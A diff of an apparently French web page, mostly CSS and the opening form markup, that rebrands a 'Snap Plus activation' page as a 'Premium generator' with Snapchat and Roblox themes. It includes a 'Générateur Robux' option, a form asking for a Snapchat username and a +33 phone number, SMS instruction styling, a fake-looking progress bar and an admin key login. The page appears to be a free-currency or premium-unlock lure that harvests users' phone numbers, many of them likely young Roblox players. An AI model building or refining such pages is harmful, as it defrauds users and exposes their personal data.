@@ -4,119 +4,123 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
     
-    <meta name="theme-color" content="#1e053d">
+    <meta name="theme-color" content="#1e053d" id="meta-theme-color">
     <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
     
-    <title>Activation Snap Plus</title>
+    <title>Générateur & Activation Premium</title>
     <style>
+        /* --- VARIABLES CSS DYNAMIQUES (THEMING) --- */
+        :root {
+            /* Thème Snapchat par défaut */
+            --bg-start: #0d011a;
+            --bg-end: #1e053d;
+            --primary: #cc33ff;
+            --secondary: #ff0080;
+            --accent: #ffb400;
+            --border-glow: rgba(255, 0, 255, 0.5);
+            --shadow-glow: rgba(204, 51, 255, 0.4);
+            --logo-bg: #fffc00;
+            --text-glow: #df80ff;
+        }
+
+        body.theme-roblox {
+            /* Thème Roblox (Bleu Profond & Brillant) */
+            --bg-start: #020024;
+            --bg-end: #0a0047;
+            --primary: #00d4ff;
+            --secondary: #0055ff;
+            --accent: #ffffff;
+            --border-glow: rgba(0, 212, 255, 0.5);
+            --shadow-glow: rgba(0, 170, 255, 0.4);
+            --logo-bg: transparent;
+            --text-glow: #80d4ff;
+        }
+
         /* --- STYLE GÉNÉRAL --- */
         html, body {
-            background-color: #0d011a;
+            background-color: var(--bg-start);
             margin: 0; padding: 0; height: 100%;
             font-family: -apple-system, system-ui, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
             color: white; overflow-x: hidden;
             -webkit-tap-highlight-color: transparent;
-            transition: background 1s ease;
+            transition: background-color 0.8s ease;
         }
 
-        /* --- 1. SYSTÈME D'AUTHENTIFICATION (WATER GLASS) --- */
+        /* --- EFFET ÉTOILES (ROBLOX THEME) --- */
+        .stars-bg {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background-image: 
+                radial-gradient(2px 2px at 20px 30px, #ffffff, rgba(0,0,0,0)),
+                radial-gradient(2px 2px at 40px 70px, #ffffff, rgba(0,0,0,0)),
+                radial-gradient(2px 2px at 50px 160px, #ffffff, rgba(0,0,0,0)),
+                radial-gradient(2px 2px at 90px 40px, #ffffff, rgba(0,0,0,0)),
+                radial-gradient(2px 2px at 130px 80px, #ffffff, rgba(0,0,0,0));
+            background-repeat: repeat;
+            background-size: 200px 200px;
+            opacity: 0; pointer-events: none; transition: opacity 0.8s ease; z-index: -1;
+        }
+        body.theme-roblox .stars-bg { opacity: 0.3; }
+
+        /* --- 1. SYSTÈME D'AUTHENTIFICATION --- */
         #login-overlay {
             position: fixed;
             top: 0; left: 0; width: 100%; height: 100%;
-            background: radial-gradient(circle at top, #1e053d 0%, #0d011a 100%);
-            display: flex; justify-content: center;
-            align-items: center;
-            z-index: 10000;
-            transition: opacity 0.5s ease;
-            overflow-y: auto; /* Fix du scroll : permet le défilement vertical si nécessaire */
-            padding: 20px;
-            box-sizing: border-box;
+            background: radial-gradient(circle at top, var(--bg-end) 0%, var(--bg-start) 100%);
+            display: flex; justify-content: center; align-items: center;
+            z-index: 10000; transition: opacity 0.5s ease;
+            overflow-y: auto; padding: 20px; box-sizing: border-box;
         }
 
         .glass-panel {
-            width: 85%;
-            max-width: 320px;
+            width: 85%; max-width: 320px;
             background: rgba(255, 255, 255, 0.05);
-            backdrop-filter: blur(20px);
-            -webkit-backdrop-filter: blur(20px);
-            border-radius: 35px;
-            padding: 40px 25px;
-            text-align: center;
-            border: 2px solid rgba(204, 51, 255, 0.3);
-            box-shadow: 0 0 40px rgba(204, 51, 255, 0.2);
-            margin: auto; /* Permet le parfait centrage vertical dynamique avec le scroll */
+            backdrop-filter: blur(20px); -webkit-backdrop-filter: blur(20px);
+            border-radius: 35px; padding: 40px 25px; text-align: center;
+            border: 2px solid var(--shadow-glow);
+            box-shadow: 0 0 40px var(--shadow-glow); margin: auto;
         }
 
         .login-title {
-            font-size: 23px;
-            font-weight: 900; 
-            margin-bottom: 30px;
-            letter-spacing: 1px;
+            font-size: 23px; font-weight: 900; margin-bottom: 30px; letter-spacing: 1px;
             text-transform: uppercase;
-            background: linear-gradient(to right, #cc33ff, #ff0080);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
+            background: linear-gradient(to right, var(--primary), var(--secondary));
+            -webkit-background-clip: text; -webkit-text-fill-color: transparent;
         }
 
         .login-input-group {
-            background: rgba(0, 0, 0, 0.3);
-            border-radius: 50px;
-            margin-bottom: 15px;
-            padding: 5px 20px;
-            display: flex;
-            align-items: center;
-            border: 1.5px solid rgba(255, 0, 128, 0.3);
-            transition: border-color 0.3s ease, transform 0.2s ease;
+            background: rgba(0, 0, 0, 0.3); border-radius: 50px; margin-bottom: 15px; padding: 5px 20px;
+            display: flex; align-items: center; border: 1.5px solid rgba(255, 255, 255, 0.1);
+            transition: border-color 0.3s ease, box-shadow 0.3s ease;
         }
-
         .login-input-group:focus-within {
-            border-color: rgba(255, 0, 128, 0.6);
-            box-shadow: 0 0 10px rgba(204, 51, 255, 0.2);
+            border-color: var(--primary); box-shadow: 0 0 10px var(--shadow-glow);
         }
-
         .login-input-group svg { width: 20px; height: 20px; fill: rgba(255, 255, 255, 0.6); margin-right: 15px; }
-
         .login-input-group input {
-            background: transparent;
-            border: none; color: white;
-            padding: 15px 0; width: 100%; outline: none; font-size: 16px; height: auto;
+            background: transparent; border: none; color: white; padding: 15px 0; width: 100%; outline: none; font-size: 16px;
         }
         .login-input-group input::placeholder { color: rgba(255, 255, 255, 0.5); }
 
-        .btn-login {
+        .btn-login, .btn-glow, .btn-return {
             width: 100%;
-            background: linear-gradient(135deg, #cc33ff, #ff0080);
+            background: linear-gradient(135deg, var(--primary), var(--secondary));
             border: none; border-radius: 50px; padding: 18px;
-            color: white; font-weight: 900; font-size: 16px;
-            margin-top: 15px; cursor: pointer;
-            box-shadow: 0 5px 20px rgba(255, 0, 128, 0.4);
-            text-transform: uppercase;
-            transition: all 0.3s ease;
+            color: white; font-weight: 900; font-size: 16px; cursor: pointer;
+            box-shadow: 0 5px 20px var(--shadow-glow); text-transform: uppercase; transition: all 0.3s ease;
         }
-
-        .btn-login:hover:not(:disabled) {
-            transform: translateY(-2px);
-            box-shadow: 0 8px 30px rgba(255, 0, 128, 0.6);
+        .btn-glow, .btn-return { border-radius: 12px; font-size: 18px; letter-spacing: 2px; margin-bottom: 30px; padding: 20px; }
+        .btn-login:hover:not(:disabled), .btn-glow:hover:not(:disabled), .btn-return:hover:not(:disabled) {
+            transform: translateY(-2px); box-shadow: 0 8px 30px var(--border-glow);
         }
-        .btn-login:disabled { opacity: 0.7; cursor: not-allowed; }
+        .btn-login:disabled, .btn-glow:disabled, .btn-return:disabled { opacity: 0.7; cursor: not-allowed; }
 
-        /* --- BOUTONS INVITÉ & DÉMO (HARMONISÉS) --- */
-        .btn-guest {
+        .btn-guest, .btn-demo-direct {
             width: 100%; background: transparent; border: 1px solid rgba(255, 255, 255, 0.1);
             border-radius: 50px; padding: 15px; color: rgba(255, 255, 255, 0.6);
             margin-top: 15px; font-size: 14px; cursor: pointer; transition: all 0.3s ease;
         }
-        .btn-guest:hover {
-            color: white; border-color: rgba(204, 51, 255, 0.5); background: rgba(255, 255, 255, 0.05);
-        }
-
-        .btn-demo-direct {
-            width: 100%; background: transparent; border: 1px solid rgba(255, 255, 255, 0.1);
-            border-radius: 50px; padding: 15px; color: rgba(255, 255, 255, 0.6);
-            margin-top: 15px; font-size: 14px; cursor: pointer; transition: all 0.3s ease;
-        }
-        .btn-demo-direct:hover {
-            color: white; border-color: rgba(204, 51, 255, 0.5); background: rgba(255, 255, 255, 0.05);
+        .btn-guest:hover, .btn-demo-direct:hover {
+            color: white; border-color: var(--primary); background: rgba(255, 255, 255, 0.05);
         }
 
         /* --- POPUP KEY ACCESS --- */
@@ -126,96 +130,82 @@
             display: flex; justify-content: center; align-items: center;
             z-index: 20000; animation: fadeIn 0.3s ease;
         }
-
         .popup-box {
-            background: #1e053d; padding: 35px 25px; border-radius: 25px; text-align: center;
-            border: 2px solid #cc33ff; width: 85%; max-width: 320px; box-shadow: 0 10px 50px rgba(204, 51, 255, 0.4);
-        }
-
-        .welcome-msg { 
-            font-size: 24px; font-weight: 900; color: #4ade80; 
-            animation: fadeIn 0.5s ease-in; text-transform: uppercase;
+            background: var(--bg-end); padding: 35px 25px; border-radius: 25px; text-align: center;
+            border: 2px solid var(--primary); width: 85%; max-width: 320px; box-shadow: 0 10px 50px var(--shadow-glow);
         }
 
         /* --- 2. CONTENU PRINCIPAL --- */
-        #main-site { display: none; opacity: 0; transition: opacity 0.8s ease; }
+        #main-site { display: none; opacity: 0; transition: opacity 0.8s ease; position: relative; z-index: 1; }
         .container { width: 100%; max-width: 380px; padding: 60px 20px; text-align: center; margin: 0 auto; box-sizing: border-box; }
 
-        /* --- BADGES (ADMIN & DEMO) --- */
+        /* --- BADGES --- */
         .admin-badge {
             display: none; padding: 8px 16px; border-radius: 50px; font-size: 11px;
             font-weight: 900; margin: -20px auto 30px auto; width: max-content;
             text-transform: uppercase; letter-spacing: 2px;
         }
-        .badge-vip {
-            background: rgba(0, 255, 128, 0.1); border: 1px solid #00ff80;
-            color: #00ff80; animation: pulseVIP 1.5s infinite;
-        }
-        .badge-demo {
-            background: rgba(255, 204, 0, 0.1); border: 1px solid #ffcc00;
-            color: #ffcc00; animation: pulseDemo 1.5s infinite;
-        }
+        .badge-vip { background: rgba(0, 255, 128, 0.1); border: 1px solid #00ff80; color: #00ff80; animation: pulseVIP 1.5s infinite; }
+        .badge-demo { background: rgba(255, 204, 0, 0.1); border: 1px solid #ffcc00; color: #ffcc00; animation: pulseDemo 1.5s infinite; }
 
-        @keyframes pulseVIP {
-            0%, 100% { box-shadow: 0 0 10px rgba(0, 255, 128, 0.2); opacity: 1; }
-            50% { box-shadow: 0 0 20px rgba(0, 255, 128, 0.6); opacity: 0.7; }
-        }
-        @keyframes pulseDemo {
-            0%, 100% { box-shadow: 0 0 10px rgba(255, 204, 0, 0.2); opacity: 1; }
-            50% { box-shadow: 0 0 20px rgba(255, 204, 0, 0.6); opacity: 0.7; }
-        }
+        @keyframes pulseVIP { 0%, 100% { box-shadow: 0 0 10px rgba(0, 255, 128, 0.2); } 50% { box-shadow: 0 0 20px rgba(0, 255, 128, 0.6); } }
+        @keyframes pulseDemo { 0%, 100% { box-shadow: 0 0 10px rgba(255, 204, 0, 0.2); } 50% { box-shadow: 0 0 20px rgba(255, 204, 0, 0.6); } }
 
-        /* --- ANIMATION BACKGROUND ADMIN --- */
-        @keyframes adminBgAnim {
-            0% { background-position: 0% 50%; }
-            50% { background-position: 100% 50%; }
-            100% { background-position: 0% 50%; }
+        /* --- SWITCHERS (MENUS) --- */
+        .switcher-container {
+            display: flex; background: rgba(0,0,0,0.4); border-radius: 50px;
+            padding: 5px; margin-bottom: 25px; border: 1px solid rgba(255,255,255,0.1);
         }
-        .admin-mode-active {
-            background: linear-gradient(270deg, #020005, #12002b, #050014, #180033);
-            background-size: 400% 400%; animation: adminBgAnim 12s ease infinite !important;
+        .switch-btn {
+            flex: 1; padding: 12px; text-align: center; font-weight: 800; font-size: 14px;
+            color: rgba(255,255,255,0.5); cursor: pointer; border-radius: 40px;
+            transition: all 0.3s ease; text-transform: uppercase; letter-spacing: 1px;
         }
+        .switch-btn.active { background: linear-gradient(135deg, var(--primary), var(--secondary)); color: white; box-shadow: 0 0 15px var(--shadow-glow); }
+        
+        #sub-switcher-container { display: none; margin-top: -10px; margin-bottom: 25px; animation: fadeIn 0.3s ease; }
 
-        .logo-wrapper { position: relative; width: 150px; height: 150px; margin: 0 auto 35px; }
+        /* --- LOGO & TITRE --- */
+        .logo-wrapper { position: relative; width: 140px; height: 140px; margin: 0 auto 30px; transition: transform 0.5s ease; }
         .border-gradient {
-            width: 100%; height: 100%; background: linear-gradient(135deg, #cc33ff, #ff0080);
+            width: 100%; height: 100%; background: linear-gradient(135deg, var(--primary), var(--secondary));
             border-radius: 40px; display: flex; justify-content: center; align-items: center;
-            box-shadow: 0 0 35px rgba(204, 51, 255, 0.4);
+            box-shadow: 0 0 35px var(--shadow-glow); transition: background 0.8s ease;
         }
-        .snap-bg { 
-            width: 88%; height: 88%; background-color: #fffc00; border-radius: 32px; 
-            display: flex; justify-content: center; align-items: center; overflow: hidden;
+        .logo-bg { 
+            width: 88%; height: 88%; background-color: var(--logo-bg); border-radius: 32px; 
+            display: flex; justify-content: center; align-items: center; overflow: hidden; transition: background-color 0.8s ease;
         }
-        .snap-bg img { width: 100%; height: 100%; object-fit: cover; }
+        .logo-bg img { width: 100%; height: 100%; object-fit: cover; transition: opacity 0.3s ease; }
 
         .plus-badge {
-            position: absolute; top: -4px; right: -4px; background-color: #ffb400; color: #1a0133;
-            width: 40px; height: 40px; border-radius: 50%; font-size: 24px; font-weight: bold;
-            display: flex; justify-content: center; align-items: center; border: 4px solid #1e053d;
+            position: absolute; top: -5px; right: -5px; background-color: var(--accent); color: var(--bg-end);
+            width: 42px; height: 42px; border-radius: 50%; font-size: 22px; font-weight: 900;
+            display: flex; justify-content: center; align-items: center; border: 4px solid var(--bg-end);
+            transition: all 0.8s ease;
         }
 
-        .title { color: #df80ff; font-size: 24px; font-weight: 800; letter-spacing: 2px; margin-bottom: 35px; text-transform: uppercase; }
+        .title { color: var(--text-glow); font-size: 24px; font-weight: 900; letter-spacing: 2px; margin-bottom: 35px; text-transform: uppercase; transition: color 0.8s ease; }
 
+        /* --- INPUTS --- */
         .input-group { 
-            display: flex; border: 2px solid rgba(255, 0, 255, 0.5); border-radius: 12px; 
-            margin-bottom: 20px; background-color: #0d011a; align-items: center; overflow: hidden;
-            transition: border-color 0.3s ease, transform 0.2s ease;
+            display: flex; border: 2px solid var(--border-glow); border-radius: 12px; 
+            margin-bottom: 20px; background-color: rgba(0,0,0,0.3); align-items: center; overflow: hidden;
+            transition: border-color 0.3s ease, box-shadow 0.2s ease;
         }
-        .input-group:focus-within { border-color: rgba(255, 0, 255, 0.8); box-shadow: 0 0 10px rgba(204, 51, 255, 0.2); }
+        .input-group:focus-within { border-color: var(--primary); box-shadow: 0 0 10px var(--shadow-glow); }
         .input-group label { display: none; }
 
         .prefix-phone { 
-            background-color: #1a0533; padding: 0 15px; height: 58px; font-weight: bold; font-size: 17px; 
+            background-color: rgba(0,0,0,0.4); padding: 0 15px; height: 58px; font-weight: bold; font-size: 17px; 
             display: flex; align-items: center; justify-content: center; gap: 8px;
-            border-right: 1px solid rgba(255, 0, 255, 0.2); white-space: nowrap; 
+            border-right: 1px solid var(--border-glow); white-space: nowrap; 
         }
 
-        input { 
-            flex: 1; border: none; background: transparent; padding: 0 18px; color: white; font-size: 17px; outline: none; height: 58px;
-        }
+        input { flex: 1; border: none; background: transparent; padding: 0 18px; color: white; font-size: 17px; outline: none; height: 58px; }
         input::placeholder { color: rgba(255, 255, 255, 0.5); }
 
-        /* --- SÉLECTEUR 100% CUSTOM --- */
+        /* --- SÉLECTEUR CUSTOM --- */
         .dropdown-group { position: relative; overflow: visible !important; display: block; padding: 0; }
         .custom-select-trigger {
             display: flex; justify-content: space-between; align-items: center; height: 58px; 
@@ -226,9 +216,9 @@
         .select-arrow svg { width: 16px; height: 16px; fill: rgba(255, 255, 255, 0.5); }
         
         .custom-select-options {
-            position: absolute; top: calc(100% + 5px); left: 0; width: 100%; background: #15022e; 
-            border: 2px solid rgba(255, 0, 255, 0.8); border-radius: 12px;
-            z-index: 100; display: none; flex-direction: column; overflow: hidden; box-shadow: 0 10px 30px rgba(204, 51, 255, 0.4);
+            position: absolute; top: calc(100% + 5px); left: 0; width: 100%; background: var(--bg-end); 
+            border: 2px solid var(--border-glow); border-radius: 12px;
+            z-index: 100; display: none; flex-direction: column; overflow: hidden; box-shadow: 0 10px 30px var(--shadow-glow);
         }
         .custom-select-options.open { display: flex; animation: fadeIn 0.2s ease; }
         .custom-select-trigger.open .select-arrow { transform: rotate(180deg); }
@@ -238,40 +228,20 @@
             border-bottom: 1px solid rgba(255, 255, 255, 0.05); transition: all 0.3s ease; text-align: left; cursor: pointer;
         }
         .custom-option:last-child { border-bottom: none; }
-        .custom-option:hover { background: rgba(204, 51, 255, 0.2); color: #ff0080; padding-left: 25px; }
+        .custom-option:hover { background: rgba(255, 255, 255, 0.1); color: var(--primary); padding-left: 25px; }
 
-        .btn-glow { 
-            width: 100%; background: linear-gradient(135deg, #cc33ff, #ff0080); border: none; border-radius: 12px; padding: 20px; 
-            color: white; font-weight: 800; text-transform: uppercase; font-size: 18px; letter-spacing: 2px;
-            cursor: pointer; box-shadow: 0 0 20px rgba(255, 0, 255, 0.5); margin-bottom: 30px; transition: all 0.3s ease;
-        }
-        .btn-glow:hover:not(:disabled) { transform: translateY(-2px); box-shadow: 0 0 30px rgba(255, 0, 255, 0.8); }
-        .btn-glow:disabled { opacity: 0.7; cursor: not-allowed; }
-
-        .btn-return {
-            width: 100%; background: linear-gradient(135deg, #cc33ff, #ff0080); border: none; border-radius: 12px; padding: 20px;
-            color: white; font-weight: 800; text-transform: uppercase; font-size: 18px; letter-spacing: 2px;
-            cursor: pointer; box-shadow: 0 0 20px rgba(255, 0, 255, 0.5); margin-bottom: 30px; transition: all 0.3s ease;
-        }
-        .btn-return:hover:not(:disabled) { transform: translateY(-2px); box-shadow: 0 0 30px rgba(255, 0, 255, 0.8); }
-        .btn-return:disabled { opacity: 0.7; cursor: not-allowed; }
-
+        /* --- STATUS & INFOS --- */
         .sms-instruction { font-size: 18px; font-weight: 800; margin-bottom: 8px; }
-        .sms-subtext { color: #7a7a7a; font-size: 14px; margin-bottom: 25px; transition: color 0.3s ease; }
+        .sms-subtext { color: #aaaaaa; font-size: 14px; margin-bottom: 25px; }
 
         .status-box { 
-            background-color: rgba(30, 15, 60, 0.6); border: 1px solid rgba(255, 255, 255, 0.1); 
+            background-color: rgba(0, 0, 0, 0.3); border: 1px solid rgba(255, 255, 255, 0.1); 
             border-radius: 20px; padding: 35px 20px; margin-bottom: 40px; min-height: 180px; display: flex; flex-direction: column; justify-content: center; 
         }
         
-        .info-box { background-color: rgba(25, 10, 45, 0.7); border: 1px solid rgba(255, 255, 255, 0.1); border-radius: 20px; padding: 25px 20px; text-align: left; }
-        .info-header { color: #ffcc00; font-weight: 900; margin-bottom: 12px; font-size: 16px; }
+        .info-box { background-color: rgba(0, 0, 0, 0.3); border: 1px solid rgba(255, 255, 255, 0.1); border-radius: 20px; padding: 25px 20px; text-align: left; }
+        .info-header { color: var(--accent); font-weight: 900; margin-bottom: 12px; font-size: 16px; }
         .info-text { font-size: 14px; opacity: 0.9; margin: 0; line-height: 1.5; }
-
-        .spinner {
-            width: 40px; height: 40px; border: 4px solid rgba(255, 255, 255, 0.2); border-top: 4px solid #cc33ff; border-radius: 50%;
-            animation: spin 1s linear infinite; margin: 20px auto;
-        }
 
         .error-message {
             position: fixed; top: 20px; left: 50%; transform: translateX(-50%);
@@ -283,24 +253,24 @@
         /* --- BARRE DE PROGRESSION --- */
         .progress-wrapper { width: 100%; margin-top: 25px; }
         .progress-bar-bg { width: 100%; height: 8px; background: rgba(255, 255, 255, 0.1); border-radius: 4px; overflow: hidden; }
-        .progress-bar-fill { height: 100%; width: 0%; background: linear-gradient(90deg, #cc33ff, #ff0080); transition: width 0.4s ease; }
-        .status-text { margin-top: 15px; font-size: 14px; color: #df80ff; min-height: 20px; font-weight: 600; }
+        .progress-bar-fill { height: 100%; width: 0%; background: linear-gradient(90deg, var(--primary), var(--secondary)); transition: width 0.4s ease; }
+        .status-text { margin-top: 15px; font-size: 14px; color: var(--text-glow); min-height: 20px; font-weight: 600; }
 
-        /* --- FAQ SECTION (NETTOYÉE) --- */
+        /* --- FAQ SECTION --- */
         .faq-section {
-            margin-top: 35px; text-align: left; background: rgba(30, 15, 60, 0.4);
+            margin-top: 35px; text-align: left; background: rgba(0, 0, 0, 0.3);
             border: 1px solid rgba(255, 255, 255, 0.05); border-radius: 20px; padding: 20px;
         }
         .faq-title { font-size: 17px; font-weight: 900; color: white; margin-bottom: 15px; text-transform: uppercase; letter-spacing: 1px; text-align: center; }
         .faq-item { border-bottom: 1px solid rgba(255, 255, 255, 0.05); padding: 14px 0; cursor: pointer; }
         .faq-item:last-child { border-bottom: none; }
-        .faq-question { font-size: 14px; font-weight: 700; display: flex; justify-content: space-between; align-items: center; color: #cc33ff; }
+        .faq-question { font-size: 14px; font-weight: 700; display: flex; justify-content: space-between; align-items: center; color: var(--primary); }
         .faq-question::after { content: '＋'; font-size: 14px; color: rgba(255, 255, 255, 0.4); transition: transform 0.3s ease; }
-        .faq-item.active .faq-question::after { transform: rotate(45deg); color: #ff0080; }
+        .faq-item.active .faq-question::after { transform: rotate(45deg); color: var(--secondary); }
         .faq-answer { font-size: 13px; opacity: 0; max-height: 0; overflow: hidden; transition: all 0.3s cubic-bezier(0, 1, 0, 1); margin-top: 0; color: #a0a0a0; line-height: 1.5; }
         .faq-item.active .faq-answer { opacity: 1; max-height: 150px; margin-top: 10px; transition: all 0.3s ease-in-out; }
 
-        /* --- FOOTER CONTACT TIKTOK --- */
+        /* --- FOOTER & ADMIN --- */
         .footer-contact { margin-top: 40px; text-align: center; padding-bottom: 10px; }
         .contact-title { font-size: 12px; font-weight: 900; letter-spacing: 2px; color: rgba(255, 255, 255, 0.3); margin-bottom: 15px; text-transform: uppercase; }
         .tiktok-btn {
@@ -309,49 +279,13 @@
             padding: 18px 28px; border-radius: 12px; text-decoration: none; color: white; font-weight: 700; font-size: 16px;
             transition: all 0.3s ease; gap: 12px; box-shadow: 0 4px 15px rgba(0, 0, 0, 0.2);
         }
-        .tiktok-btn:hover { background: rgba(255, 255, 255, 0.08); border-color: #ff0080; transform: translateY(-2px); box-shadow: 0 5px 20px rgba(255, 0, 128, 0.25); }
+        .tiktok-btn:hover { background: rgba(255, 255, 255, 0.08); border-color: var(--secondary); transform: translateY(-2px); }
         .tiktok-icon { width: 20px; height: 20px; object-fit: contain; }
 
-        /* --- SECTION ADMIN : KEY GENERATOR --- */
-        .admin-panel {
-            margin-top: 35px; padding: 25px; background: rgba(0, 255, 128, 0.05);
-            border: 1px solid rgba(0, 255, 128, 0.3); border-radius: 20px; text-align: left;
-        }
-        .admin-panel-title { color: #00ff80; font-size: 14px; font-weight: 900; margin-bottom: 20px; text-transform: uppercase; letter-spacing: 1px; text-align: center; }
-        .key-list { list-style: none; padding: 0; margin: 20px 0 0 0; max-height: 200px; overflow-y: auto; }
-        .key-item {
-            display: flex; justify-content: space-between; align-items: center;
-            background: rgba(255, 255, 255, 0.05); padding: 12px 15px; border-radius: 12px; margin-bottom: 10px;
-            font-family: monospace; font-size: 13px; color: #df80ff; border: 1px solid rgba(255, 255, 255, 0.05);
-            animation: fadeIn 0.3s ease;
-        }
-        .key-actions { display: flex; gap: 8px; }
-        .key-actions button {
-            background: transparent; border: none; cursor: pointer; font-size: 12px; 
-            padding: 6px 12px; border-radius: 6px; font-weight: bold; transition: all 0.2s ease;
-        }
-        .btn-copy { color: #4ade80; border: 1px solid rgba(74, 222, 128, 0.3); }
-        .btn-copy:hover { background: rgba(74, 222, 128, 0.15); }
-        .btn-revoke { color: #ff4d4d; border: 1px solid rgba(255, 77, 77, 0.3); }
-        .btn-revoke:hover { background: rgba(255, 77, 77, 0.15); }
-
-        /* --- VERSION V1.52 --- */
-        .patch-version {
-            margin-top: 35px;
-            text-align: center;
-            color: #4ade80;
-            font-weight: 900;
-            font-size: 14px;
-            font-family: monospace;
-            letter-spacing: 2px;
-        }
+        .patch-version { margin-top: 35px; text-align: center; color: #4ade80; font-weight: 900; font-size: 14px; font-family: monospace; letter-spacing: 2px; }
 
         /* --- ANIMATIONS --- */
-        @keyframes shakeEffect {
-            0%, 100% { transform: translateX(0); }
-            20%, 60% { transform: translateX(-6px); }
-            40%, 80% { transform: translateX(6px); }
-        }
+        @keyframes shakeEffect { 0%, 100% { transform: translateX(0); } 20%, 60% { transform: translateX(-6px); } 40%, 80% { transform: translateX(6px); } }
         .shake { animation: shakeEffect 0.4s ease-in-out; border-color: #ff4d4d !important; }
         @keyframes spin { to { transform: rotate(360deg); } }
         @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
@@ -361,33 +295,29 @@
         @media (max-width: 480px) {
             .container { padding: 40px 15px; }
             .title { font-size: 20px; }
-            .btn-glow, .btn-return { padding: 16px; font-size: 16px; }
-            .tiktok-btn { padding: 16px 28px; font-size: 15px; }
             .logo-wrapper { width: 120px; height: 120px; margin-bottom: 25px; }
-            .key-item { flex-direction: column; align-items: flex-start; gap: 10px; }
-            .key-actions { width: 100%; justify-content: flex-end; }
-        }
-        @media (max-width: 360px) {
-            .logo-wrapper { width: 100px; height: 100px; }
-            .title { font-size: 18px; }
-            .glass-panel { padding: 30px 20px; }
+            .plus-badge { width: 36px; height: 36px; font-size: 18px; }
         }
     </style>
 </head>
 <body>
 
+    <!-- EFFET ÉTOILES POUR THEME ROBLOX -->
+    <div class="stars-bg"></div>
+
+    <!-- OVERLAY CONNEXION -->
     <div id="login-overlay">
         <div class="glass-panel">
-            <h2 class="login-title">Connexion Administrateur</h2>
+            <h2 class="login-title">Accès Sécurisé</h2>
             
             <div class="login-input-group" id="group-adminUser">
-                <svg viewBox="0 0 24 24" role="img" aria-label="Utilisateur"><path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"/></svg>
-                <input type="text" id="adminUser" placeholder="Identifiant" aria-label="Identifiant administrateur">
+                <svg viewBox="0 0 24 24"><path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"/></svg>
+                <input type="text" id="adminUser" placeholder="Identifiant">
             </div>
 
             <div class="login-input-group" id="group-adminPass">
-                <svg viewBox="0 0 24 24" role="img" aria-label="Mot de passe"><path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z"/></svg>
-                <input type="password" id="adminPass" placeholder="Mot de passe" aria-label="Mot de passe administrateur">
+                <svg viewBox="0 0 24 24"><path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z"/></svg>
+                <input type="password" id="adminPass" placeholder="Mot de passe">
             </div>
 
             <button class="btn-login" onclick="checkLogin()">SE CONNECTER</button>
@@ -396,69 +326,79 @@
         </div>
     </div>
 
+    <!-- CONTENU PRINCIPAL -->
     <div id="main-site">
         <div class="container">
             
             <div id="admin-badge" class="admin-badge"></div>
 
-            <div class="logo-wrapper">
-                <div class="border-gradient">
-                    <div class="snap-bg">
-                        <img src="logosnapchat.png" alt="Logo Snapchat">
-                    </div>
-                </div>
-                <div class="plus-badge">+</div>
+            <!-- MENU GLOBAL -->
+            <div class="switcher-container">
+                <div class="switch-btn active" id="btn-snap" onclick="setService('snap')">Snapchat</div>
+                <div class="switch-btn" id="btn-roblox" onclick="setService('roblox')">Roblox</div>
             </div>
 
-            <h1 class="title">ACTIVATION SNAP<br>PLUS +</h1>
+            <!-- SOUS-MENU ROBLOX -->
+            <div class="switcher-container" id="sub-switcher-container">
+                <div class="switch-btn active" id="btn-robux" onclick="setSubService('robux')">Générateur Robux</div>
+                <div class="switch-btn" id="btn-roblox-plus" onclick="setSubService('roblox_plus')">Roblox+</div>
+            </div>
 
+            <!-- LOGO DYNAMIQUE -->
+            <div class="logo-wrapper">
+                <div class="border-gradient">
+                    <div class="logo-bg" id="logo-bg">
+                        <img src="logosnapchat.png" id="main-logo" alt="Logo Service">
+                    </div>
+                </div>
+                <div class="plus-badge" id="plus-badge">+</div>
+            </div>
+
+            <h1 class="title" id="main-title">ACTIVATION SNAP<br>PLUS +</h1>
+
+            <!-- ÉTAPE 1 : FORMULAIRE -->
             <div id="step-1">
                 <div class="input-group" id="group-username">
-                    <label for="username">Nom d'utilisateur Snapchat</label>
-                    <input type="text" id="username" placeholder="Nom d'utilisateur Snapchat" aria-label="Nom d'utilisateur Snapchat" maxlength="50">
+                    <input type="text" id="username" placeholder="Nom d'utilisateur Snapchat" maxlength="50">
                 </div>
                 
                 <div class="input-group" id="group-phone">
-                    <label for="phone">Numéro de téléphone</label>
-                    <div class="prefix-phone" aria-hidden="true">+33 🇫🇷</div>
-                    <input type="tel" id="phone" placeholder="123456789" aria-label="Numéro de téléphone" maxlength="10" inputmode="numeric">
+                    <div class="prefix-phone">+33 🇫🇷</div>
+                    <input type="tel" id="phone" placeholder="Numéro de téléphone (10 chiffres)" maxlength="10" inputmode="numeric">
                 </div>
 
                 <div class="input-group dropdown-group" id="group-offer">
                     <input type="hidden" id="offer-select" value="">
-                    
                     <div class="custom-select-trigger" id="offer-trigger">
                         <span id="offer-label">Sélectionner l'offre</span>
-                        <div class="select-arrow">
